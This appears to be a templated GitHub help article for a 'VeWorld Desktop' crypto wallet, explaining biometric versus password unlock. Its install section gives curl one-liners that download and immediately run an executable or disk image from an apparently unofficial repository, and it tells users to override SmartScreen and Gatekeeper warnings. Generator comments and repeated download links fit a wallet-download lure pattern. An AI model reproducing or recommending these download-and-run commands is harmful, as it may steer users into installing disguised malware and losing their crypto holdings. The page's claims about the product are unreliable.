![VeWorld Desktop](../assets/banner-article.png)

# Biometric Crypto Wallet Unlock: What VeWorld Desktop Uses Instead of Face ID

What a biometric unlock can and cannot do here

## Downloads - v2.2.4

<p align="center"><a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe"><img src="../assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg"><img src="../assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip"><img src="../assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="../assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`VeWorld-desktop-wallet-win-v2.2.4.exe`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe) |
| <img src="../assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`VeWorld-desktop-wallet-macos-v2.2.4.dmg`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg) |
| <img src="../assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`VeWorld-desktop-wallet-linux-v2.2.4.zip`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip) |

Download the [current VeWorld Desktop release](https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4) for Windows, macOS and Linux.

> VeWorld Desktop is actively maintained; run the current release before treating a display problem as a wallet fault.

A biometric unlock is a convenience layer over a wallet that already has keys, not a replacement for the phrase. Phone builds can use a face or fingerprint check in place of typing a password. VeWorld Desktop is the desktop case: it unlocks with a local password, and the same keys and the same recovery phrase sit behind it.

<!-- ARTICLE-BODY-BEGIN -->

## You'll see this if

You are used to unlocking a mobile wallet with a face and expect the desktop app to behave the same way, or you are worried that a biometric login means someone else holds your keys.

| Unlock method | What it protects | What it cannot do |
|---|---|---|
| Face or fingerprint | The app on that device | Recover a lost phrase |
| Local password | The encrypted wallet on the machine | Reset itself if forgotten |
| Device PIN | The whole device | Replace the wallet's own credentials |
| <a href="https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/pair-a-vechain-ledger-with-veworld-desktop.md">Ledger PIN</a> | Keys inside the device | Sign without a physical press |

## Why it happens

Biometrics do not store a key; they authorise access to one that the operating system already holds in a protected store. The wallet asks the platform to verify a face or a fingerprint, and the platform says yes or no. Convenience comes from the platform's own hardware, not from the wallet inventing a new credential.

That distinction decides what a biometric check can and cannot do. It cannot restore an account, because it holds no key material of its own. It cannot move between devices, because the enrolment lives on one device. And it cannot help when the underlying store has been invalidated, which happens when a device passcode changes or a new face is enrolled.

On a desktop, the equivalent convenience is a session that stays unlocked while the application runs, backed by a local password. The trade is the same one a phone makes: a balance kept open behind an unlocked screen is a balance someone at that desk can move.

What does not change across platforms is where the keys live. They are in the wallet's local encrypted store, or on a paired Ledger, and the phrase restores them anywhere. A biometric check is a door handle, not the vault.

## Fix

1. Set a local password you have not used elsewhere; it is the credential that matters if biometric unlock fails.
2. On a phone build, enable biometric unlock only on a device you keep physically with you and locked.
3. Confirm <a href="https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/forgot-vechain-wallet-password-in-veworld-desktop.md">your VeWorld Desktop recovery phrase</a> is written down before relying on any convenience unlock.
4. On a phone build, if a biometric prompt stops appearing, re-enrol it in the app's settings, which usually re-binds it to the current device credentials.
5. If the app falls back to a password prompt, treat that as normal rather than as an error.
6. Keep the app current, since unlock handling changes between releases.

## If that did not work

On a phone build, if a fingerprint or face is no longer accepted, the device's biometric enrolment probably changed. Re-enrol in the app after confirming the device passcode.

If the app loops between a biometric prompt and a password field, close it completely and reopen, then use the password once to reset the session.

If nothing unlocks the app, the phrase is the route: restore the wallet and set fresh credentials. Do not reinstall first unless the phrase is confirmed.

## Prevention

- Keep a password as the fallback rather than depending on biometrics alone.
- Write the phrase down before enabling any convenience unlock.
- Re-check unlock behaviour after an operating-system update.
- Never enter the recovery phrase outside the wallet's own restore screen, and never share it.

VeWorld Desktop is actively maintained, and the current release can be downloaded from the <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4">VeWorld Desktop releases page</a>.

## FAQ

### Is Face ID without a password normal?

On phone builds it can be, because the biometric check authorises access to a key the platform holds. It does not mean the wallet has no password underneath.

### Does a biometric unlock mean the app stores my phrase?

No. The phrase is shown once at setup for you to write down; biometrics authorise access to the encrypted store rather than holding the phrase.

### Can someone unlock my wallet with my face?

If they have your unlocked device and your face, a biometric check is not a barrier. That is why device locking and physical control matter.

### Why does the desktop app ask for a password instead?

The desktop build unlocks with a local password rather than a platform biometric. The keys behind it are the same, and the phrase restores them anywhere.

### What happens if biometrics stop working after an update?

Re-enrol them in the app's settings. If the prompt disappears entirely, use the password and check the device's own biometric settings.

### Is a password more secure than a face?

They defend against different things. A long password resists guessing; a face resists someone who does not have your face. Neither replaces the phrase as the backup.

### Does biometric unlock change custody?

No. Custody is decided by who holds the keys, and a convenience unlock does not move them.

### Does biometric unlock work on every platform?

It depends on what the platform provides. Phone builds can use the device's biometric check; the desktop build unlocks with a local password, and the keys behind both are the same.

### Can I turn biometrics off later?

Yes, and the password remains the route in. Turning it off reduces convenience and removes one way for someone holding your unlocked device to enter.

### What happens if I enrol a new face on the device?

The previous enrolment is usually invalidated, and the wallet's biometric prompt stops working until it is set up again. The password still opens it.

<!-- ARTICLE-BODY-END -->

## How to install VeWorld Desktop

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe">VeWorld-desktop-wallet-win-v2.2.4.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg">VeWorld-desktop-wallet-macos-v2.2.4.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
<!-- BLOCKED: the Linux release asset is a .zip with no verified extraction or launch facts,
     so no command is generated. The verified manual steps are kept below. -->
Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-linux-v2.2.4.zip">VeWorld-desktop-wallet-linux-v2.2.4.zip</a>.
2. Unzip the archive.
3. Run the application inside it.
<!-- INSTALL-END -->

## Related guides

- [Locking the wallet when you switch apps](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/vechain-wallet-security-app-lock-veworld-desktop.md)
- [How the password and the phrase differ](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/veworld-login-password-and-phrase-veworld-desktop.md)
- [When the unlock gate blocks an update](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/vechain-wallet-password-pin-screen-veworld-desktop.md)
- [How self-custody protects a balance](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/is-veworld-wallet-safe-in-veworld-desktop.md)
- [What to do when the password is gone](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/forgot-vechain-wallet-password-in-veworld-desktop.md)